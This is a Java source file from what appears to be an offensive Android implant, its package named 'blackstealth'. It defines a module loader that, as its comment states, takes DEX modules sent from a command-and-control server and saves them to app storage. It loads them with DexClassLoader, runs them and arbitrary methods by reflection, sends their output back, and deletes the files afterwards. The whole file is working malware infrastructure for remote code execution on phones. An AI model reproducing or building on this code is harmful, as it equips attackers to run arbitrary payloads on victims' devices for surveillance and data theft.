package com.offensive.blackstealth.modules;

import android.content.Context;
import android.util.Log;
import dalvik.system.DexClassLoader;
import java.io.*;
import java.lang.reflect.*;
import java.util.*;
import java.util.concurrent.*;

/**
 * Dynamic Module Loader
 * Loads DEX modules from C2 at runtime
 */
public class ModuleLoader {
    private static final String TAG = "ModuleLoader";
    
    private Context context;
    private File modulesDir;
    private File dexOutputDir;
    private Map<String, LoadedModule> loadedModules;
    private ExecutorService executor;
    private ModuleCallback callback;
    
    public static class LoadedModule {
        public String id;
        public String name;
        public String version;
        public Class<?> moduleClass;
        public Object instance;
        public long loadedAt;
        public boolean isRunning;
    }
    
    public interface ModuleCallback {
        void onModuleLoaded(String moduleId, String name);
        void onModuleUnloaded(String moduleId);
        void onModuleError(String moduleId, String error);
        void onModuleOutput(String moduleId, String output);
    }
    
    public ModuleLoader(Context context) {
        this.context = context;
        this.modulesDir = new File(context.getFilesDir(), "modules");
        this.dexOutputDir = new File(context.getFilesDir(), "dex_output");
        this.loadedModules = new ConcurrentHashMap<>();
        this.executor = Executors.newCachedThreadPool();
        
        modulesDir.mkdirs();
        dexOutputDir.mkdirs();
    }
    
    public void setCallback(ModuleCallback callback) {
        this.callback = callback;
    }
    
    /**
     * Load module from DEX file
     */
    public boolean loadModule(String moduleId, byte[] dexData) {
        try {
            // Save DEX to file
            File dexFile = new File(modulesDir, moduleId + ".dex");
            FileOutputStream fos = new FileOutputStream(dexFile);
            fos.write(dexData);
            fos.close();
            
            return loadModuleFromFile(moduleId, dexFile);
            
        } catch (Exception e) {
            Log.e(TAG, "Load module failed: " + e.getMessage());
            if (callback != null) callback.onModuleError(moduleId, e.getMessage());
            return false;
        }
    }
    
    /**
     * Load module from file
     */
    public boolean loadModuleFromFile(String moduleId, File dexFile) {
        try {
            // Create class loader
            DexClassLoader classLoader = new DexClassLoader(
                dexFile.getAbsolutePath(),
                dexOutputDir.getAbsolutePath(),
                null,
                context.getClassLoader()
            );
            
            // Find module class (convention: com.module.<moduleId>.Module)
            String className = "com.module." + moduleId + ".Module";
            Class<?> moduleClass = classLoader.loadClass(className);
            
            // Create instance
            Constructor<?> constructor = moduleClass.getConstructor(Context.class);
            Object instance = constructor.newInstance(context);
            
            // Get module info
            String name = moduleId;
            String version = "1.0";
            
            try {
                Method getNameMethod = moduleClass.getMethod("getName");
                name = (String) getNameMethod.invoke(instance);
            } catch (Exception e) {}
            
            try {
                Method getVersionMethod = moduleClass.getMethod("getVersion");
                version = (String) getVersionMethod.invoke(instance);
            } catch (Exception e) {}
            
            // Store loaded module
            LoadedModule module = new LoadedModule();
            module.id = moduleId;
            module.name = name;
            module.version = version;
            module.moduleClass = moduleClass;
            module.instance = instance;
            module.loadedAt = System.currentTimeMillis();
            module.isRunning = false;
            
            loadedModules.put(moduleId, module);
            
            Log.i(TAG, "Module loaded: " + name + " v" + version);
            if (callback != null) callback.onModuleLoaded(moduleId, name);
            
            return true;
            
        } catch (Exception e) {
            Log.e(TAG, "Load module failed: " + e.getMessage());
            if (callback != null) callback.onModuleError(moduleId, e.getMessage());
            return false;
        }
    }
    
    /**
     * Start a module
     */
    public boolean startModule(String moduleId) {
        LoadedModule module = loadedModules.get(moduleId);
        if (module == null) return false;
        
        try {
            Method startMethod = module.moduleClass.getMethod("start");
            executor.submit(() -> {
                try {
                    module.isRunning = true;
                    startMethod.invoke(module.instance);
                } catch (Exception e) {
                    if (callback != null) callback.onModuleError(moduleId, e.getMessage());
                }
            });
            
            Log.i(TAG, "Module started: " + module.name);
            return true;
            
        } catch (NoSuchMethodException e) {
            Log.e(TAG, "Module has no start method: " + moduleId);
            return false;
        }
    }
    
    /**
     * Stop a module
     */
    public boolean stopModule(String moduleId) {
        LoadedModule module = loadedModules.get(moduleId);
        if (module == null) return false;
        
        try {
            Method stopMethod = module.moduleClass.getMethod("stop");
            stopMethod.invoke(module.instance);
            module.isRunning = false;
            
            Log.i(TAG, "Module stopped: " + module.name);
            return true;
            
        } catch (Exception e) {
            Log.e(TAG, "Stop module failed: " + e.getMessage());
            return false;
        }
    }
    
    /**
     * Execute module method
     */
    public Object executeMethod(String moduleId, String methodName, Object... args) {
        LoadedModule module = loadedModules.get(moduleId);
        if (module == null) return null;
        
        try {
            // Find method with matching name
            Method[] methods = module.moduleClass.getMethods();
            for (Method method : methods) {
                if (method.getName().equals(methodName) && 
                    method.getParameterCount() == args.length) {
                    
                    Object result = method.invoke(module.instance, args);
                    
                    if (result != null && callback != null) {
                        callback.onModuleOutput(moduleId, result.toString());
                    }
                    
                    return result;
                }
            }
            
            Log.e(TAG, "Method not found: " + methodName);
            return null;
            
        } catch (Exception e) {
            Log.e(TAG, "Execute method failed: " + e.getMessage());
            if (callback != null) callback.onModuleError(moduleId, e.getMessage());
            return null;
        }
    }
    
    /**
     * Unload a module
     */
    public void unloadModule(String moduleId) {
        LoadedModule module = loadedModules.get(moduleId);
        if (module == null) return;
        
        // Stop if running
        if (module.isRunning) {
            stopModule(moduleId);
        }
        
        // Clean up
        try {
            Method cleanupMethod = module.moduleClass.getMethod("cleanup");
            cleanupMethod.invoke(module.instance);
        } catch (Exception e) {}
        
        // Remove from map
        loadedModules.remove(moduleId);
        
        // Delete DEX file
        File dexFile = new File(modulesDir, moduleId + ".dex");
        if (dexFile.exists()) {
            dexFile.delete();
        }
        
        Log.i(TAG, "Module unloaded: " + moduleId);
        if (callback != null) callback.onModuleUnloaded(moduleId);
    }
    
    /**
     * Get list of loaded modules
     */
    public List<LoadedModule> getLoadedModules() {
        return new ArrayList<>(loadedModules.values());
    }
    
    /**
     * Get loaded module by ID
     */
    public LoadedModule getModule(String moduleId) {
        return loadedModules.get(moduleId);
    }
    
    /**
     * Check if module is loaded
     */
    public boolean isLoaded(String moduleId) {
        return loadedModules.containsKey(moduleId);
    }
    
    /**
     * Get module info as JSON
     */
    public String getModulesJson() {
        StringBuilder sb = new StringBuilder("[");
        boolean first = true;
        
        for (LoadedModule module : loadedModules.values()) {
            if (!first) sb.append(",");
            sb.append(String.format(
                "{\"id\":\"%s\",\"name\":\"%s\",\"version\":\"%s\"," +
                "\"loadedAt\":%d,\"running\":%b}",
                module.id, module.name, module.version, 
                module.loadedAt, module.isRunning));
            first = false;
        }
        
        sb.append("]");
        return sb.toString();
    }
    
    /**
     * Unload all modules
     */
    public void unloadAll() {
        for (String moduleId : new ArrayList<>(loadedModules.keySet())) {
            unloadModule(moduleId);
        }
    }
    
    /**
     * Clean module cache
     */
    public void cleanCache() {
        File[] cacheFiles = dexOutputDir.listFiles();
        if (cacheFiles != null) {
            for (File f : cacheFiles) {
                f.delete();
            }
        }
    }
    
    public void shutdown() {
        unloadAll();
        executor.shutdown();
    }
}
